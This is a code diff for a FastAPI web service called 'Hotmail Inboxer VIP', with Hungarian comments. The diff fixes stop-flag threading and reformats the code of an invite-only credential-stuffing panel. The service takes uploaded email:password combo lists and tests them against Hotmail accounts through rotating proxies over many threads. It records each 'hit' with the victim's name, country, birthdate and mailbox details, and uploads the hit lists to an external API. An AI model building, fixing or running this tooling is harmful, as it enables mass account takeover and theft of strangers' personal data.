@@ -21,11 +21,14 @@ from proxy_manager import proxy_manager
 
 user_connections = {}
 ws_lock = threading.Lock()
-stop_flags = {}
+
+# ✅ FIX: threading.Event() használata asyncio.Event() helyett!
+stop_flags = {}       # user_id -> threading.Event
 stop_lock = threading.Lock()
 
 MAX_WORKERS = 40
 ADMIN_EMAIL = "xat.king6969@gmail.com"
+
 
 def upload_to_external_api(content: str, filename: str) -> str:
     if not content or len(content.strip()) == 0:
@@ -45,11 +48,12 @@ def upload_to_external_api(content: str, filename: str) -> str:
         pass
     return None
 
+
 @asynccontextmanager
 async def lifespan(app: FastAPI):
     print("\n🔧 Startup...")
     await asyncio.to_thread(proxy_manager.fetch_proxies)
-    working_count = await asyncio.to_thread(proxy_manager.test_and_filter, 3000, 500, 8)
+    working_count = await asyncio.to_thread(proxy_manager.test_and_filter, 5000, 500, 8)
 
     if working_count == 0:
         print("⚠️  Nem találtunk működő proxyt!")
@@ -79,50 +83,67 @@ async def lifespan(app: FastAPI):
         for user_id in list(stop_flags.keys()):
             stop_flags[user_id].set()
 
+
 app = FastAPI(title="Hotmail Inboxer VIP", lifespan=lifespan)
 app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"])
 templates = Jinja2Templates(directory="templates")
 app.mount("/static", StaticFiles(directory="static"), name="static")
 
+
 def broadcast_to_user(user_id: str, message: str):
     with ws_lock:
-        if user_id not in user_connections: return
+        if user_id not in user_connections:
+            return
         dead = []
         for ws_info in user_connections[user_id]:
-            try: asyncio.run_coroutine_threadsafe(ws_info["ws"].send_text(message), ws_info["loop"])
-            except: dead.append(ws_info)
-        for d in dead: user_connections[user_id].remove(d)
-        if not user_connections[user_id]: del user_connections[user_id]
+            try:
+                asyncio.run_coroutine_threadsafe(ws_info["ws"].send_text(message), ws_info["loop"])
+            except:
+                dead.append(ws_info)
+        for d in dead:
+            user_connections[user_id].remove(d)
+        if not user_connections[user_id]:
+            del user_connections[user_id]
 
+
+# ==========================================
+# OLDALAK
+# ==========================================
 @app.get("/", response_class=HTMLResponse)
-async def login_page(request: Request): return templates.TemplateResponse("login.html", {"request": request})
+async def login_page(request: Request):
+    return templates.TemplateResponse("login.html", {"request": request})
 
 @app.get("/register", response_class=HTMLResponse)
-async def register_page(request: Request): return templates.TemplateResponse("register.html", {"request": request})
+async def register_page(request: Request):
+    return templates.TemplateResponse("register.html", {"request": request})
 
 @app.get("/dashboard", response_class=HTMLResponse)
-async def dashboard_page(request: Request): return templates.TemplateResponse("dashboard.html", {"request": request})
+async def dashboard_page(request: Request):
+    return templates.TemplateResponse("dashboard.html", {"request": request})
 
 @app.get("/admin", response_class=HTMLResponse)
-async def admin_page(request: Request): return templates.TemplateResponse("admin.html", {"request": request})
+async def admin_page(request: Request):
+    return templates.TemplateResponse("admin.html", {"request": request})
 
 
+# ==========================================
+# AUTH API
+# ==========================================
 @app.post("/api/register")
 async def register(email: str = Form(...), password: str = Form(...), invite_code: str = Form(...)):
     if len(password) < 6:
         raise HTTPException(status_code=400, detail="Minimum 6 karakter jelszó")
-    
+
     invite = await get_invite_code(invite_code)
     if not invite or invite.get("is_used"):
         raise HTTPException(status_code=400, detail="Érvénytelen vagy már felhasznált meghívó kód!")
 
     if await get_user_by_email(email):
         raise HTTPException(status_code=400, detail="Foglalt email cím")
-    
+
     await create_user(email, hash_password(password), invite_code)
-    # FONTOS: Csak felhasználtra állítjuk, nem töröljük! Így látszik az admin panelen!
     await mark_invite_used(invite_code, email)
-    
+
     return {"token": create_access_token({"sub": email}), "email": email}
 
 
@@ -133,10 +154,10 @@ async def login(email: str = Form(...), password: str = Form(...)):
         raise HTTPException(status_code=401, detail="Hibás adatok")
     return {"token": create_access_token({"sub": email}), "email": email}
 
+
 # ==========================================
 # ADMIN ÉS FIÓK ZÁROLÁS API
 # ==========================================
-
 @app.get("/api/me")
 async def get_me(current_user=Depends(get_current_user)):
     return {"email": current_user["email"], "needs_new_invite": current_user.get("needs_new_invite", False)}
@@ -146,14 +167,15 @@ async def reactivate_account(invite_code: str = Form(...), current_user=Depends(
     invite = await get_invite_code(invite_code)
     if not invite or invite.get("is_used"):
         raise HTTPException(status_code=400, detail="Érvénytelen vagy már felhasznált kód!")
-    
+
     await reactivate_user(current_user["email"], invite_code)
     await mark_invite_used(invite_code, current_user["email"])
     return {"status": "success"}
 
 @app.get("/api/admin/invites")
 async def get_invites(current_user=Depends(get_current_user)):
-    if current_user["email"] != ADMIN_EMAIL: raise HTTPException(status_code=403, detail="Nincs jogosultságod!")
+    if current_user["email"] != ADMIN_EMAIL:
+        raise HTTPException(status_code=403, detail="Nincs jogosultságod!")
     invites = await get_all_invites()
     for inv in invites:
         inv["_id"] = str(inv["_id"])
@@ -162,24 +184,33 @@ async def get_invites(current_user=Depends(get_current_user)):
 
 @app.post("/api/admin/generate_invite")
 async def generate_invite(current_user=Depends(get_current_user)):
-    if current_user["email"] != ADMIN_EMAIL: raise HTTPException(status_code=403, detail="Nincs jogosultságod!")
+    if current_user["email"] != ADMIN_EMAIL:
+        raise HTTPException(status_code=403, detail="Nincs jogosultságod!")
     new_code = "INBOX-" + str(uuid.uuid4()).split('-')[0].upper()
     await create_invite_code(new_code)
     return {"status": "success", "code": new_code}
 
 @app.delete("/api/admin/invites/{code}")
 async def delete_invite(code: str, current_user=Depends(get_current_user)):
-    if current_user["email"] != ADMIN_EMAIL: raise HTTPException(status_code=403, detail="Nincs jogosultságod!")
-    # Megvonjuk a kódot ÉS zároljuk a felhasználót
+    if current_user["email"] != ADMIN_EMAIL:
+        raise HTTPException(status_code=403, detail="Nincs jogosultságod!")
     await revoke_invite_and_lock_user(code)
     return {"status": "deleted"}
 
-# ==========================================
 
+# ==========================================
+# PROXY API
+# ==========================================
 @app.get("/api/proxy_status")
 async def proxy_status(current_user=Depends(get_current_user)):
     stats = proxy_manager.get_stats()
-    return {"proxy_count": stats["total"], "http": stats["http"], "socks4": stats["socks4"], "socks5": stats["socks5"], "tested": proxy_manager.is_tested()}
+    return {
+        "proxy_count": stats["total"],
+        "http": stats["http"],
+        "socks4": stats["socks4"],
+        "socks5": stats["socks5"],
+        "tested": proxy_manager.is_tested()
+    }
 
 @app.post("/api/refresh_proxies")
 async def refresh_proxies(current_user=Depends(get_current_user)):
@@ -187,36 +218,62 @@ async def refresh_proxies(current_user=Depends(get_current_user)):
     stats = proxy_manager.get_stats()
     return {"proxy_count": count, "http": stats["http"], "socks4": stats["socks4"], "socks5": stats["socks5"]}
 
+
+# ==========================================
+# ✅ CHECKER START / STOP (JAVÍTOTT!)
+# ==========================================
 @app.post("/api/start")
-async def start_checker(file: UploadFile, keyword: str = Form(...), threads: int = Form(MAX_WORKERS), current_user=Depends(get_current_user)):
+async def start_checker(
+    file: UploadFile,
+    keyword: str = Form(...),
+    threads: int = Form(MAX_WORKERS),
+    current_user=Depends(get_current_user)
+):
     if current_user.get("needs_new_invite"):
         raise HTTPException(status_code=403, detail="Fiók zárolva! Kérj új meghívó kódot.")
 
-    if await get_active_run(str(current_user["_id"])): raise HTTPException(status_code=400, detail="Már fut egy checker!")
+    if await get_active_run(str(current_user["_id"])):
+        raise HTTPException(status_code=400, detail="Már fut egy checker!")
+
     threads = max(1, min(threads, 100))
 
     content = await file.read()
-    lines = [l.strip() for l in content.decode("utf-8", errors="ignore").splitlines() if ':' in l and '@' in l and l.count(':') == 1]
-    if not lines: raise HTTPException(status_code=400, detail="Nincs érvényes email:jelszó sor")
+    lines = [
+        l.strip() for l in content.decode("utf-8", errors="ignore").splitlines()
+        if ':' in l and '@' in l and l.count(':') == 1
+    ]
+    if not lines:
+        raise HTTPException(status_code=400, detail="Nincs érvényes email:jelszó sor")
 
     user_id = str(current_user["_id"])
     run_id = await create_run(user_id, keyword, len(lines))
     await delete_old_runs(user_id, run_id)
 
-    with stop_lock: stop_flags[user_id] = asyncio.Event()
-    threading.Thread(target=lambda: asyncio.run(execute_checker(run_id, user_id, lines, keyword, threads)), daemon=True).start()
+    # ✅ FIX: threading.Event() az asyncio.Event() helyett!
+    with stop_lock:
+        stop_flags[user_id] = threading.Event()
+
+    threading.Thread(
+        target=lambda: asyncio.run(execute_checker(run_id, user_id, lines, keyword, threads)),
+        daemon=True
+    ).start()
 
     return {"run_id": run_id, "total": len(lines), "threads": threads, "proxies": proxy_manager.get_stats()}
+
 
 @app.post("/api/stop")
 async def stop_checker(current_user=Depends(get_current_user)):
     user_id = str(current_user["_id"])
     with stop_lock:
         if user_id in stop_flags:
-            stop_flags[user_id].set()
+            stop_flags[user_id].set()  # ✅ threading.Event.set() — thread-safe!
             return {"status": "stopping"}
     raise HTTPException(status_code=404, detail="Nincs futó checker")
 
+
+# ==========================================
+# ✅ CHECKER VÉGREHAJTÁS (JAVÍTOTT STOP LOGIKA)
+# ==========================================
 async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, num_threads: int = MAX_WORKERS):
     checked = hits = custom = bad = retries = 0
     total = len(lines)
@@ -225,141 +282,249 @@ async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, 
     stats = proxy_manager.get_stats()
     pc = stats["total"]
 
-    mode = f"🔒 {pc} proxy (H:{stats['http']} S5:{stats['socks5']} S4:{stats['socks4']})" if pc > 0 else "⚠️ Nincs proxy!"
-    broadcast_to_user(user_id, json.dumps({"type": "log", "level": "info", "text": f"[START] {total} combo | {keyword} | {num_threads} szál"}))
-    broadcast_to_user(user_id, json.dumps({"type": "log", "level": "info", "text": f"[MODE] {mode}"}))
+    mode = (
+        f"🔒 {pc} proxy (H:{stats['http']} S5:{stats['socks5']} S4:{stats['socks4']})"
+        if pc > 0 else "⚠️ Nincs proxy!"
+    )
+    broadcast_to_user(user_id, json.dumps({
+        "type": "log", "level": "info",
+        "text": f"[START] {total} combo | {keyword} | {num_threads} szál"
+    }))
+    broadcast_to_user(user_id, json.dumps({
+        "type": "log", "level": "info",
+        "text": f"[MODE] {mode}"
+    }))
 
     main_loop = asyncio.get_event_loop()
 
+    # ✅ Stop event lekérése egyszer — thread-safe threading.Event!
+    stop_event = None
+    with stop_lock:
+        if user_id in stop_flags:
+            stop_event = stop_flags[user_id]
+
     def check_single(line):
         nonlocal checked, hits, custom, bad, retries, stopped
-        with stop_lock:
-            if user_id in stop_flags and stop_flags[user_id].is_set(): return
-        try: email, password = line.split(':', 1)
-        except: return
 
-        result = checker_worker_single(email, password, keyword)
+        # ✅ Azonnali stop ellenőrzés
+        if stop_event and stop_event.is_set():
+            return
+
+        try:
+            email, password = line.split(':', 1)
+        except:
+            return
+
+        # ✅ stop_event átadása a checker-nek! (retry loop-ban is ellenőrzi)
+        result = checker_worker_single(email, password, keyword, stop_event=stop_event)
 
         with lock:
-            with stop_lock:
-                if user_id in stop_flags and stop_flags[user_id].is_set():
-                    stopped = True
-                    return
+            # ✅ Stop ellenőrzés eredmény feldolgozás előtt
+            if stop_event and stop_event.is_set():
+                stopped = True
+                return
+
             checked += 1
 
             if result["status"] == "hit":
                 hits += 1
                 d = result["data"]
-                lt = f"{d['email']}:{d['password']} | Country={d['country']} | Name={d['name']} | Birthdate={d['birthdate']} | Mails={d['mails']} | LastMail={d['date']}"
+                lt = (
+                    f"{d['email']}:{d['password']} | Country={d['country']} | "
+                    f"Name={d['name']} | Birthdate={d['birthdate']} | "
+                    f"Mails={d['mails']} | LastMail={d['date']}"
+                )
                 try:
-                    asyncio.run_coroutine_threadsafe(add_result_to_run(run_id, "hit", lt), main_loop).result(timeout=5)
-                    asyncio.run_coroutine_threadsafe(add_result_details_to_run(run_id, "hit", d), main_loop).result(timeout=5)
-                except: pass
+                    asyncio.run_coroutine_threadsafe(
+                        add_result_to_run(run_id, "hit", lt), main_loop
+                    ).result(timeout=5)
+                    asyncio.run_coroutine_threadsafe(
+                        add_result_details_to_run(run_id, "hit", d), main_loop
+                    ).result(timeout=5)
+                except:
+                    pass
                 broadcast_to_user(user_id, json.dumps({"type": "log", "level": "hit", "text": f"[HIT] {lt}"}))
                 broadcast_to_user(user_id, json.dumps({"type": "live_hit", "data": d}))
+
             elif result["status"] == "custom":
                 custom += 1
                 d = result["data"]
-                lt = f"{d['email']}:{d['password']} | Country={d['country']} | Name={d['name']} | Birthdate={d['birthdate']}"
+                lt = (
+                    f"{d['email']}:{d['password']} | Country={d['country']} | "
+                    f"Name={d['name']} | Birthdate={d['birthdate']}"
+                )
                 try:
-                    asyncio.run_coroutine_threadsafe(add_result_to_run(run_id, "custom", lt), main_loop).result(timeout=5)
-                    asyncio.run_coroutine_threadsafe(add_result_details_to_run(run_id, "custom", d), main_loop).result(timeout=5)
-                except: pass
+                    asyncio.run_coroutine_threadsafe(
+                        add_result_to_run(run_id, "custom", lt), main_loop
+                    ).result(timeout=5)
+                    asyncio.run_coroutine_threadsafe(
+                        add_result_details_to_run(run_id, "custom", d), main_loop
+                    ).result(timeout=5)
+                except:
+                    pass
                 broadcast_to_user(user_id, json.dumps({"type": "log", "level": "custom", "text": f"[CUSTOM] {lt}"}))
                 broadcast_to_user(user_id, json.dumps({"type": "live_custom", "data": d}))
+
             elif result["status"] == "bad":
                 bad += 1
                 broadcast_to_user(user_id, json.dumps({"type": "log", "level": "bad", "text": f"[BAD] {email}"}))
+
             else:
                 retries += 1
 
             if checked % 5 == 0 or checked == total:
-                try: asyncio.run_coroutine_threadsafe(update_run_stats(run_id, {"checked": checked, "hits": hits, "custom": custom, "bad": bad, "retries": retries}), main_loop)
-                except: pass
+                try:
+                    asyncio.run_coroutine_threadsafe(
+                        update_run_stats(run_id, {
+                            "checked": checked, "hits": hits, "custom": custom,
+                            "bad": bad, "retries": retries
+                        }),
+                        main_loop
+                    )
+                except:
+                    pass
 
-            broadcast_to_user(user_id, json.dumps({"type": "stats", "run_id": run_id, "checked": checked, "hits": hits, "custom": custom, "bad": bad, "retries": retries, "total": total}))
+            broadcast_to_user(user_id, json.dumps({
+                "type": "stats", "run_id": run_id,
+                "checked": checked, "hits": hits, "custom": custom,
+                "bad": bad, "retries": retries, "total": total
+            }))
 
     def run_parallel():
         with ThreadPoolExecutor(max_workers=num_threads) as executor:
             futures = []
             for line in lines:
-                with stop_lock:
-                    if user_id in stop_flags and stop_flags[user_id].is_set(): break
+                # ✅ Stop ellenőrzés: ne adj be új feladatot ha stop-ot nyomtak!
+                if stop_event and stop_event.is_set():
+                    break
                 futures.append(executor.submit(check_single, line))
+
             for future in as_completed(futures):
-                try: future.result()
-                except: pass
+                # ✅ Ha stop van, ne várjunk a többi future-re
+                if stop_event and stop_event.is_set():
+                    # Próbáljuk cancelálni a pending future-öket
+                    for f in futures:
+                        f.cancel()
+                    break
+                try:
+                    future.result()
+                except:
+                    pass
 
     await asyncio.to_thread(run_parallel)
-    await update_run_stats(run_id, {"checked": checked, "hits": hits, "custom": custom, "bad": bad, "retries": retries})
+
+    # Végső statisztikák mentése
+    await update_run_stats(run_id, {
+        "checked": checked, "hits": hits, "custom": custom,
+        "bad": bad, "retries": retries
+    })
     await update_run_status_only(run_id, "finished")
 
+    # Eredmények feltöltése
     if hits > 0 or custom > 0:
-        broadcast_to_user(user_id, json.dumps({"type": "log", "level": "info", "text": "⏳ Eredmények feltöltése..."}))
+        broadcast_to_user(user_id, json.dumps({
+            "type": "log", "level": "info", "text": "⏳ Eredmények feltöltése..."
+        }))
         final_run = await get_run(run_id)
         if final_run:
             hit_lines = final_run.get("hit_lines", [])
             custom_lines = final_run.get("custom_lines", [])
-            hits_url = await asyncio.to_thread(upload_to_external_api, "\n".join(hit_lines), f"Hotmail_Hits_{run_id}.txt") if hit_lines else None
-            custom_url = await asyncio.to_thread(upload_to_external_api, "\n".join(custom_lines), f"Hotmail_Custom_{run_id}.txt") if custom_lines else None
+            hits_url = await asyncio.to_thread(
+                upload_to_external_api, "\n".join(hit_lines), f"Hotmail_Hits_{run_id}.txt"
+            ) if hit_lines else None
+            custom_url = await asyncio.to_thread(
+                upload_to_external_api, "\n".join(custom_lines), f"Hotmail_Custom_{run_id}.txt"
+            ) if custom_lines else None
             await finish_and_clean_run(run_id, hits_url, custom_url)
     else:
         await finish_and_clean_run(run_id, None, None)
 
-    with stop_lock:
-        if user_id in stop_flags and stop_flags[user_id].is_set(): stopped = True
+    # ✅ Stop állapot ellenőrzése
+    if stop_event and stop_event.is_set():
+        stopped = True
 
     st_text = "LEÁLLÍTVA" if stopped else "KÉSZ"
-    broadcast_to_user(user_id, json.dumps({"type": "log", "level": "finish", "text": f"[{st_text}] Hits: {hits} | Custom: {custom} | Bad: {bad}"}))
+    broadcast_to_user(user_id, json.dumps({
+        "type": "log", "level": "finish",
+        "text": f"[{st_text}] Hits: {hits} | Custom: {custom} | Bad: {bad}"
+    }))
     broadcast_to_user(user_id, json.dumps({"type": "finished", "run_id": run_id}))
 
+    # ✅ Stop flag törlése
     with stop_lock:
-        if user_id in stop_flags: del stop_flags[user_id]
+        if user_id in stop_flags:
+            del stop_flags[user_id]
 
 
+# ==========================================
+# EREDMÉNYEK
+# ==========================================
 @app.get("/api/runs")
 async def get_user_runs_list(current_user=Depends(get_current_user)):
     runs = await get_user_finished_runs(str(current_user["_id"]))
     for r in runs:
         r["_id"] = str(r["_id"])
         r["started_at"] = r["started_at"].isoformat()
-        if r.get("finished_at"): r["finished_at"] = r["finished_at"].isoformat()
+        if r.get("finished_at"):
+            r["finished_at"] = r["finished_at"].isoformat()
     return runs
 
 @app.get("/api/get_download_url/{run_id}/{type}")
 async def get_download_url(run_id: str, type: str, current_user=Depends(get_current_user)):
     run = await get_run(run_id)
-    if not run or run["user_id"] != str(current_user["_id"]): raise HTTPException(status_code=404)
-    if type == "hits" and run.get("hits_url"): return {"url": run["hits_url"]}
-    if type == "custom" and run.get("custom_url"): return {"url": run["custom_url"]}
+    if not run or run["user_id"] != str(current_user["_id"]):
+        raise HTTPException(status_code=404)
+    if type == "hits" and run.get("hits_url"):
+        return {"url": run["hits_url"]}
+    if type == "custom" and run.get("custom_url"):
+        return {"url": run["custom_url"]}
     return {"url": f"/api/download_direct/{run_id}/{type}?token={current_user['email']}"}
 
 @app.get("/api/download_direct/{run_id}/{type}")
 async def download_direct(run_id: str, type: str):
     run = await get_run(run_id)
-    if not run: raise HTTPException(status_code=404)
+    if not run:
+        raise HTTPException(status_code=404)
     lines = run.get("hit_lines" if type == "hits" else "custom_lines", [])
-    return PlainTextResponse(content="\n".join(lines) if lines else "Nincs eredmény", headers={"Content-Disposition": f'attachment; filename="Hotmail-{type}.txt"'})
+    return PlainTextResponse(
+        content="\n".join(lines) if lines else "Nincs eredmény",
+        headers={"Content-Disposition": f'attachment; filename="Hotmail-{type}.txt"'}
+    )
 
+
+# ==========================================
+# WEBSOCKET
+# ==========================================
 @app.websocket("/ws")
 async def websocket_endpoint(websocket: WebSocket, token: str = ""):
     await websocket.accept()
     email = decode_token(token)
-    if not email: return await websocket.close(code=1008)
+    if not email:
+        return await websocket.close(code=1008)
     user = await get_user_by_email(email)
-    if not user: return await websocket.close(code=1008)
+    if not user:
+        return await websocket.close(code=1008)
 
     user_id = str(user["_id"])
     loop = asyncio.get_event_loop()
     ws_info = {"ws": websocket, "loop": loop}
     with ws_lock:
-        if user_id not in user_connections: user_connections[user_id] = []
+        if user_id not in user_connections:
+            user_connections[user_id] = []
         user_connections[user_id].append(ws_info)
 
     try:
         stats = proxy_manager.get_stats()
-        await websocket.send_text(json.dumps({"type": "proxy_info", "count": stats["total"], "http": stats["http"], "socks4": stats["socks4"], "socks5": stats["socks5"], "tested": proxy_manager.is_tested()}))
-    except: pass
+        await websocket.send_text(json.dumps({
+            "type": "proxy_info",
+            "count": stats["total"],
+            "http": stats["http"],
+            "socks4": stats["socks4"],
+            "socks5": stats["socks5"],
+            "tested": proxy_manager.is_tested()
+        }))
+    except:
+        pass
 
     active_run = await get_active_run(user_id)
     if active_run:
@@ -367,18 +532,23 @@ async def websocket_endpoint(websocket: WebSocket, token: str = ""):
         active_run["started_at"] = active_run["started_at"].isoformat()
         try:
             await websocket.send_text(json.dumps({"type": "active_run", "run": active_run}))
-            for hit in active_run.get("hit_details", []): await websocket.send_text(json.dumps({"type": "live_hit", "data": hit}))
-            for c in active_run.get("custom_details", []): await websocket.send_text(json.dumps({"type": "live_custom", "data": c}))
-        except: pass
+            for hit in active_run.get("hit_details", []):
+                await websocket.send_text(json.dumps({"type": "live_hit", "data": hit}))
+            for c in active_run.get("custom_details", []):
+                await websocket.send_text(json.dumps({"type": "live_custom", "data": c}))
+        except:
+            pass
 
     try:
         while True:
             data = await websocket.receive_text()
-            if data == "ping": await websocket.send_text("pong")
+            if data == "ping":
+                await websocket.send_text("pong")
     except (WebSocketDisconnect, RuntimeError, Exception):
         with ws_lock:
             if user_id in user_connections and ws_info in user_connections[user_id]:
                 user_connections[user_id].remove(ws_info)
+
 
 if __name__ == "__main__":
     import uvicorn
